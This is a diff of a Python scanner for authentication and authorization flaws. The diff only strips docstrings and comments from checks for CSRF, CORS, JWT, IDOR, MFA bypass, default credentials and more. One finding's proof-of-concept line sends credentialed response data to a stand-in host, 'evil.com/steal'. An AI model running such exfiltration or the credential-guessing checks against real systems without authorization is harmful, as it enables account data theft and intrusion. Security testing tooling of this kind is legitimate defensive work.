@@ -1,4 +1,3 @@
-"""Authentication and authorization vulnerability scanner."""
 
 from __future__ import annotations
 
@@ -59,7 +58,6 @@ AUTH_ENDPOINTS = {
 
 
 class AuthScanner:
-    """Authentication, authorization, and access control vulnerability scanner."""
 
     def __init__(
         self,
@@ -74,7 +72,6 @@ class AuthScanner:
         self.findings: list[dict] = []
 
     def run(self, target: str) -> dict[str, Any]:
-        """Full authentication/authorization scan."""
         target = sanitize_target(target)
         if not target.startswith("http"):
             target = f"https://{target}"
@@ -93,7 +90,6 @@ class AuthScanner:
         self._check_host_header_injection(target, endpoints)
         self._check_privilege_escalation(target, endpoints)
 
-        # these modify state on target
         if not sc.get("skip_default_creds") and not sc.get("skip_brute_force"):
             self._check_default_creds(target, endpoints)
         if not sc.get("skip_mfa_bypass"):
@@ -104,7 +100,6 @@ class AuthScanner:
 
 
     def _discover_endpoints(self, target: str) -> dict[str, list[str]]:
-        """Probe for auth-related endpoints."""
         found: dict[str, list[str]] = {}
 
         for category, paths in AUTH_ENDPOINTS.items():
@@ -124,7 +119,6 @@ class AuthScanner:
 
 
     def _check_csrf(self, target: str) -> None:
-        """Check for missing CSRF protection on state-changing forms."""
         try:
             resp = self.session.get(target, timeout=self.timeout)
             soup = BeautifulSoup(resp.text, "html.parser")
@@ -180,7 +174,6 @@ class AuthScanner:
             pass
 
     def _generate_csrf_poc_html(self, action: str, form) -> str:
-        """Generate CSRF PoC HTML page."""
         fields_html = ""
         for inp in form.find_all(["input", "textarea"]):
             name = inp.get("name", "")
@@ -200,7 +193,6 @@ class AuthScanner:
 
 
     def _check_cors(self, target: str) -> None:
-        """Check for CORS misconfigurations enabling credential theft."""
         test_origins = [
             "https://evil.com",
             f"https://{urlparse(target).netloc}.evil.com",
@@ -239,10 +231,9 @@ class AuthScanner:
                                 f'   fetch("{target}", {{credentials: "include", headers: {{origin: "{origin}"}}}}).then(r => r.text()).then(d => fetch("https://evil.com/steal?data=" + d))\n'
                                 f"2. Victim visits page → authenticated data stolen",
                         )
-                        return  # One finding is enough
+                        return
 
                 if acao == "*":
-                    # Wildcard with credentials is a browser error, but wildcard alone is noteworthy
                     self._add_finding(
                         vuln_id="AUTH-011",
                         title="CORS Wildcard Origin (*)",
@@ -263,7 +254,6 @@ class AuthScanner:
 
 
     def _check_default_creds(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Test for default/weak credentials on login endpoints."""
         login_urls = endpoints.get("login", [])
 
         for url in login_urls[:3]:
@@ -355,7 +345,6 @@ class AuthScanner:
 
 
     def _check_idor(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Test for Insecure Direct Object Reference vulnerabilities."""
         profile_urls = endpoints.get("profile", [])
 
         for url in profile_urls:
@@ -383,7 +372,6 @@ class AuthScanner:
                             and abs(len(resp.text) - original_length) > 50
                             and resp.status_code != 404):
 
-                            # Verify it's different data, not error page
                             if not any(e in resp.text.lower() for e in ["not found", "error", "forbidden"]):
                                 self._add_finding(
                                     vuln_id="AUTH-004",
@@ -409,7 +397,6 @@ class AuthScanner:
 
 
     def _check_jwt_vulns(self, target: str) -> None:
-        """Check for JWT implementation vulnerabilities."""
         try:
             resp = self.session.get(target, timeout=self.timeout)
 
@@ -437,7 +424,6 @@ class AuthScanner:
             pass
 
     def _analyze_jwt(self, target: str, token: str) -> None:
-        """Analyze JWT token for vulnerabilities."""
         import base64
 
         parts = token.split(".")
@@ -535,7 +521,6 @@ class AuthScanner:
 
 
     def _check_session_fixation(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Check if session IDs change after authentication."""
         login_urls = endpoints.get("login", [])
 
         for url in login_urls[:2]:
@@ -547,7 +532,6 @@ class AuthScanner:
                 if not pre_cookies:
                     continue
 
-                # can't actually auth here, just check cookie flags
                 for cookie in pre_session.cookies:
                     flags = []
                     if not cookie.secure:
@@ -579,7 +563,6 @@ class AuthScanner:
 
 
     def _check_password_reset(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Check for password reset vulnerabilities."""
         reset_urls = endpoints.get("password_reset", [])
 
         for url in reset_urls[:2]:
@@ -639,7 +622,6 @@ class AuthScanner:
 
 
     def _check_oauth_misconfig(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Check for OAuth/OIDC misconfigurations."""
         oauth_urls = endpoints.get("oauth", [])
 
         well_known_url = urljoin(target, "/.well-known/openid-configuration")
@@ -706,7 +688,6 @@ class AuthScanner:
 
 
     def _check_mfa_bypass(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Check for MFA bypass techniques."""
         mfa_paths = [
             "/api/auth/2fa", "/auth/2fa", "/2fa/verify", "/api/otp/verify",
             "/verify-otp", "/api/mfa/verify", "/mfa/challenge",
@@ -748,7 +729,6 @@ class AuthScanner:
 
 
     def _check_privilege_escalation(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Check for horizontal/vertical privilege escalation."""
         admin_urls = endpoints.get("admin", [])
 
         for url in admin_urls:
@@ -787,7 +767,6 @@ class AuthScanner:
 
 
     def _check_account_takeover(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Check for account takeover vectors via API."""
         profile_urls = endpoints.get("profile", [])
 
         for url in profile_urls[:3]:
@@ -829,7 +808,6 @@ class AuthScanner:
 
 
     def _check_host_header_injection(self, target: str, endpoints: dict[str, list[str]]) -> None:
-        """Check for Host header injection on all pages."""
         try:
             resp = self.session.get(
                 target,
@@ -858,7 +836,6 @@ class AuthScanner:
 
 
     def _add_finding(self, **kwargs: Any) -> None:
-        """Add a deduplicated finding."""
         key = (kwargs.get("vuln_id"), kwargs.get("url"), kwargs.get("title", "")[:60])
         dedup = hashlib.md5(str(key).encode()).hexdigest()
 
